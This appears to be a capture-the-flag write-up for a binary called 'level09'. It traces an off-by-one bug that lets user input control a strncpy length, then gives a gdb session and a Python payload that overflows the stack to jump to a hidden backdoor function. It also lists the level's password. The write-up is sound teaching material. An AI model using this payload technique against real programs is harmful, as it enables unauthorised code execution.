## level09

	username: level09
	password: fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S

### Mitigations applied:

```
$ checksec --file level09
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   level09
```

### Usage:

```
$ ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: admin
>: Welcome, admin
>: Msg @Unix-Dude
>>: Heelloooooo
>: Msg sent!
```

### Analysis:

We have five functions: `main()`, `handle_msg()`, `set_username()`, `set_msg()` and `secret_backdoor()`

`main` calls `handle_msg()`.

```
/*
   0x0000555555554ab8 <+16>:	call   0x5555555548c0 <handle_msg>
 */
handle_msg();
```

`handle_msg` creates a buffer of 180 bytes, zeros out the last 40 bytes.

```
char	buf[0xb4];		/* rbp-0xc0 */

/*
   0x00005555555548cb <+11>:	lea    rax,[rbp-0xc0]
   0x00005555555548d2 <+18>:	add    rax,0x8c
   0x00005555555548d8 <+24>:	mov    QWORD PTR [rax],0x0
   0x00005555555548df <+31>:	mov    QWORD PTR [rax+0x8],0x0
   0x00005555555548e7 <+39>:	mov    QWORD PTR [rax+0x10],0x0
   0x00005555555548ef <+47>:	mov    QWORD PTR [rax+0x18],0x0
   0x00005555555548f7 <+55>:	mov    QWORD PTR [rax+0x20],0x0
 */
memset(buf+0x8c, 0x0, 0x28);
```

Then calls `set_username()` with the buffer as argument.

```
/*
   0x0000555555554906 <+70>:	lea    rax,[rbp-0xc0]
   0x000055555555490d <+77>:	mov    rdi,rax
   0x0000555555554910 <+80>:	call   0x5555555549cd <set_username>
 */
set_username(buf);
```

After that it calls `set_msg()` with the buffer as argument.

`set_username` prompts the user for input.

```
/*
   0x0000555555554a1c <+79>:	mov    rax,QWORD PTR [rip+0x201595]        # 0x555555755fb8
   0x0000555555554a23 <+86>:	mov    rax,QWORD PTR [rax]
   0x0000555555554a26 <+89>:	mov    rdx,rax
   0x0000555555554a29 <+92>:	lea    rax,[rbp-0x90]
   0x0000555555554a30 <+99>:	mov    esi,0x80
   0x0000555555554a35 <+104>:	mov    rdi,rax
   0x0000555555554a38 <+107>:	call   0x555555554770 <fgets@plt>
 */
fgets(s, 0x80, stdin);
```

Then stores it in the last 40 bytes of the buffer.

```
while (i <= 0x28 && s[i] != 0x0)
{
	/*
	   0x0000555555554a46 <+121>:	mov    eax,DWORD PTR [rbp-0x4]
	   0x0000555555554a49 <+124>:	cdqe
	   0x0000555555554a4b <+126>:	movzx  ecx,BYTE PTR [rbp+rax*1-0x90]
	   0x0000555555554a53 <+134>:	mov    rdx,QWORD PTR [rbp-0x98]
	   0x0000555555554a5a <+141>:	mov    eax,DWORD PTR [rbp-0x4]
	   0x0000555555554a5d <+144>:	cdqe
	   0x0000555555554a5f <+146>:	mov    BYTE PTR [rdx+rax*1+0x8c],cl
	   0x0000555555554a66 <+153>:	add    DWORD PTR [rbp-0x4],0x1
	 */
	buf[i + 0x8c] = s[i];
	++i;
}
```

> The problem here is the index `i` goes from `0` to `0x28`, the position `0x28` is outside the buffer, which leads to overwriting the variable next to it.

`set_msg` take user input using `fgets()`

```
/*
   0x0000555555554981 <+79>:	mov    rax,QWORD PTR [rip+0x201630]        # 0x555555755fb8
   0x0000555555554988 <+86>:	mov    rax,QWORD PTR [rax]
   0x000055555555498b <+89>:	mov    rdx,rax
   0x000055555555498e <+92>:	lea    rax,[rbp-0x400]
   0x0000555555554995 <+99>:	mov    esi,0x400
   0x000055555555499a <+104>:	mov    rdi,rax
   0x000055555555499d <+107>:	call   0x555555554770 <fgets@plt>
 */
fgets(s, 0x400, stdin);
```

The input is copied to the begining of the buffer using `strncpy()`

```
/*
   0x00005555555549a2 <+112>:	mov    rax,QWORD PTR [rbp-0x408]
   0x00005555555549a9 <+119>:	mov    eax,DWORD PTR [rax+0xb4]
   0x00005555555549af <+125>:	movsxd rdx,eax
   0x00005555555549b2 <+128>:	lea    rcx,[rbp-0x400]
   0x00005555555549b9 <+135>:	mov    rax,QWORD PTR [rbp-0x408]
   0x00005555555549c0 <+142>:	mov    rsi,rcx
   0x00005555555549c3 <+145>:	mov    rdi,rax
   0x00005555555549c6 <+148>:	call   0x555555554720 <strncpy@plt>
 */
strncpy(buf, s, (size_t)*((int*)(buf+0xb4)));
```

Normally `strncpy` is a secure function as it takes as third argument the length `n` to be copied.

The problem here is the way `n` is fetched, they access the buffer at index `0xb4` wich is its size, this allow to access the variable next to it.

This, combined with what we've seen earlier about being able to overwrite one byte of this variable in `set_username`, allows us to control `n` which leads to a buffer overflow.

This way we can overwrite the retrun address (eip) of `handle_msg()` and control the execution flow.

### Exploit

To verify that we can overwrite the `eip`, we started gdb and set a breakpoint at `ret` instruction in `handle_msg()`.

```
$ gdb ./level09
(gdb) b *handle_msg + 113
(gdb) r < <(python -c 'print("A"*40+"\xff\n"+"B"*200+"CCCCCCCC")')
```

When the execution stops at the breakpoint, we examined the stack as the address at the top of the stack is where the next instruction is. We can see that it has been changed.

```
Breakpoint 2, 0x0000555555554931 in handle_msg ()
(gdb) x/xg $rsp
0x7fffffffe5d8:	0x4343434343434343
```

All that's left to do is get the address of `secret_backdoor()`.

```
(gdb) p secret_backdoor
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```

```
$ (python -c 'print("A"*40+"\xff\n"+"\x90"*200+"\x8c\x48\x55\x55\x55\x55\x00\x00")';cat) | ./level09
...
whoami
end
```
